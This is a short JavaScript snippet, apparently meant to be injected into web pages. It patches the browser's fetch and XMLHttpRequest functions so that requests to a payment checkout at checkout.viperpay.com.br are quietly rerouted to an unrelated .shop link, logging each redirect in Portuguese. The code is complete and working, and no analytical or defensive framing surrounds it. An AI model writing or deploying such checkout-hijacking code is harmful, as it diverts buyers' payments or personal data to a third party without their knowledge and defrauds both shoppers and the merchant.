(function() {
  const redirectUrl = 'https://go.disruptybr.shop/eebqnkcvbf';

  const originalFetch = window.fetch;
  window.fetch = function() {
    if (arguments[0].includes('checkout.viperpay.com.br')) {
      console.log('Redirecionado:', arguments[0], '->', redirectUrl);
      arguments[0] = redirectUrl;
    }
    return originalFetch.apply(this, arguments);
  };

  const originalXHROpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (url.includes('checkout.viperpay.com.br')) {
      console.log('Redirecionado:', url, '->', redirectUrl);
      url = redirectUrl;
    }
    return originalXHROpen.apply(this, arguments);
  };
})();
